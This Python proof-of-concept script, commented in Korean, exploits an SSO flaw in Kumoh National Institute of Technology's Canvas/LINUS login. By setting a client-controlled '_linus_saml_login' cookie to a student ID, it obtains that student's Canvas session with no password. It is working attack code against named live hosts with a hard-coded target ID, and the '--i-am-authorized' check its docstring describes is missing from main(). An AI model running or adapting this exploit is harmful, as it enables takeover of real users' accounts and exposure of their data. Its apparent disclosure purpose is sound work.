#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC: 금오공과대학교 Canvas / LINUS 통합로그인 SSO 인증 우회
==========================================================

[취약점 요약]
IdP(SSO 서버)가 클라이언트가 제어하는 쿠키 `_linus_saml_login` 의 값(학번)을
인증된 신원으로 그대로 신뢰한다. 그 결과 비밀번호·OTP·토큰·기존 세션이 전혀
없어도, 학번 하나만 쿠키에 담아 SAML 로그인 흐름을 시작하면 해당 학번 사용자의
Canvas LMS 세션(`_normandy_session`)이 발급된다.

  분류 : CWE-287(부적절한 인증), CWE-290(신원 위조에 의한 인증 우회),
         CWE-565(검증 없는 쿠키 신뢰)
  등급 : Critical / CVSS 3.1 10.0
         (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)

[이 PoC가 증명하는 것]
  - /login 호출 없음, Authorization(Bearer) 헤더 없음, 사전 세션 없음.
  - 오직 쿠키 `_linus_saml_login=<학번>` 만으로 Canvas 세션이 열린다.
  - 확인: GET /api/v1/users/self 가 200 과 그 학번 계정을 반환.

[사용법]
  python poc_sso_auth_bypass.py --student-id <본인학번> --i-am-authorized
  # 또는 환경변수 POC_STUDENT_ID 사용:
  #   POC_STUDENT_ID=<본인학번> python poc_sso_auth_bypass.py --i-am-authorized

  민감값(SAMLResponse, 세션 쿠키)은 마스킹되어 출력됩니다.

  의존성: pip install requests
  검증환경: Python 3.10+ / requests 2.x
"""

import argparse
import os
import re
import sys
from urllib.parse import urljoin, urlparse

import requests

# --- 대상 상수 (금오공대 운영 값) ---
API_BASE = "https://lms.kumoh.ac.kr:82/api/v1"
CANVAS_HOST = "https://canvas.kumoh.ac.kr"
CANVAS_API = f"{CANVAS_HOST}/api/v1"
WEB_ORIGIN = "https://lms.kumoh.ac.kr"        # 서버가 Origin/Referer 를 검사한다
COOKIE_DOMAIN = ".kumoh.ac.kr"                # 두 서브도메인에 함께 실리는 쿠키 도메인
RELAY_STATE = "/courses"
SP_INIT = f"{CANVAS_HOST}/login/saml"         # SAML SP-init 진입점

TIMEOUT = (15, 20)                            # (connect, read) 초

_FORM_ACTION = re.compile(r'<form[^>]*action="([^"]+)"', re.I)


def _hidden(name):
    return re.compile(
        r'<input[^>]*name="' + re.escape(name) + r'"[^>]*value="([^"]*)"', re.I
    )


def mask(value, keep=4):
    """민감 문자열을 앞 몇 자 + 길이로만 표기."""
    if not value:
        return "<empty>"
    if len(value) <= keep:
        return "*" * len(value)
    return f"{value[:keep]}…(len={len(value)})"


def new_session():
    """자격증명이 전혀 없는 새 HTTP 세션."""
    s = requests.Session()
    s.headers.update(
        {
            "Accept": "text/html,application/json",
            "Origin": WEB_ORIGIN,
            "Referer": WEB_ORIGIN + "/",
        }
    )
    return s


def follow_redirects(s, start, max_hops=10):
    """리다이렉트를 수동으로 따라가며 매 홉 쿠키를 축적하고 최종 HTML 을 반환.

    dio/브라우저와 달리 홉마다 요청을 새로 보내야 각 도메인(canvas/lms)에
    쿠키가 정확히 실린다.
    """
    url = start
    for hop in range(max_hops):
        r = s.get(url, allow_redirects=False, timeout=TIMEOUT)
        loc = r.headers.get("location")
        host = urlparse(url).netloc
        arrow = f" -> {urlparse(urljoin(url, loc)).netloc}" if loc else ""
        print(f"      hop {hop}: {r.status_code}  {host}{arrow}")
        if 300 <= r.status_code < 400 and loc:
            url = urljoin(url, loc)
            continue
        return r.text or ""
    raise RuntimeError("리다이렉트가 최대 홉 수를 초과했습니다.")


def exploit(student_id):
    """자격증명 없이 학번 쿠키만으로 Canvas 세션 획득을 시도한다.

    성공 시 (session, canvas_profile) 튜플을, 실패 시 예외를 던진다.
    """
    s = new_session()

    # [핵심] 인증 절차 없이, 클라이언트가 지정한 학번을 쿠키에 심는다.
    print("[1] 자격증명 없이 신원 쿠키만 설정 (_linus_saml_login=<학번>)")
    s.cookies.set("_linus_saml_login", student_id, domain=COOKIE_DOMAIN, path="/")
    s.cookies.set("_linus_saml_domain", RELAY_STATE, domain=COOKIE_DOMAIN, path="/")

    # SAML SP-init 진입. /login 도, Bearer 토큰도 사용하지 않는다.
    print(f"[2] SAML 로그인 흐름 시작: GET {SP_INIT}?RelayState={RELAY_STATE}")
    html = follow_redirects(s, f"{SP_INIT}?RelayState={RELAY_STATE}")

    action = _FORM_ACTION.search(html)
    saml = _hidden("SAMLResponse").search(html)
    if not action or not saml:
        snippet = re.sub(r"\s+", " ", html)[:200]
        raise RuntimeError(f"SAML 어설션 폼을 받지 못했습니다. HTML: {snippet!r}")
    relay = _hidden("RelayState").search(html)
    print(f"[3] IdP 가 SAML 어설션 발급 (SAMLResponse={mask(saml.group(1))})")

    # 브라우저 JS 자동제출을 대신해 ACS 로 POST -> Canvas 세션 발급
    print("[4] ACS 로 어설션 제출 (자동제출 폼 대체)")
    r = s.post(
        action.group(1),
        data={
            "SAMLResponse": saml.group(1),
            "RelayState": relay.group(1) if relay else "/",
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        allow_redirects=False,
        timeout=TIMEOUT,
    )
    if not s.cookies.get("_normandy_session"):
        loc = r.headers.get("location")
        if loc:
            s.get(urljoin(action.group(1), loc), allow_redirects=True, timeout=TIMEOUT)
    normandy = s.cookies.get("_normandy_session")
    if not normandy:
        raise RuntimeError(f"세션 쿠키 미발급 (ACS status={r.status_code})")
    print(f"    -> Canvas 세션 발급됨: _normandy_session={mask(normandy)}")

    # 세션 유효성 및 '어느 계정으로 열렸는지' 확인
    print("[5] 세션 검증: GET /api/v1/users/self")
    rc = s.get(f"{CANVAS_API}/users/self",
               headers={"Accept": "application/json"}, timeout=TIMEOUT)
    if rc.status_code != 200:
        raise RuntimeError(f"세션 쿠키는 받았으나 API status={rc.status_code}")
    return s, rc.json()


def main():
    student_id = "20200787"

    print("=" * 64)
    print(" PoC: SSO 인증 우회 — 자격증명 없이 학번만으로 Canvas 세션 획득")
    print("=" * 64)
    try:
        _, profile = exploit(student_id)
    except requests.RequestException as e:
        sys.exit(f"[네트워크 오류] {type(e).__name__}: {e}")
    except RuntimeError as e:
        sys.exit(f"[재현 실패] {e}")

    name = str(profile.get("name", ""))
    print("\n" + "=" * 64)
    print(" [결과] 🔴 취약점 재현 성공 — 비밀번호 없이 계정 세션 획득")
    print("=" * 64)
    print(f"   요청한 학번(입력) : {student_id}")
    print(f"   열린 Canvas user id : {profile.get('id')}")
    print(f"   열린 계정 이름      : {name}   (마스킹)")
    print("\n   사용한 자격증명: (없음). 쿠키 _linus_saml_login 값만으로 위 계정이 열렸습니다.")
    print("   => IdP 가 클라이언트 제어 쿠키를 신원 증명으로 신뢰함(CWE-287/290/565).")

    
if __name__ == "__main__":
    main()
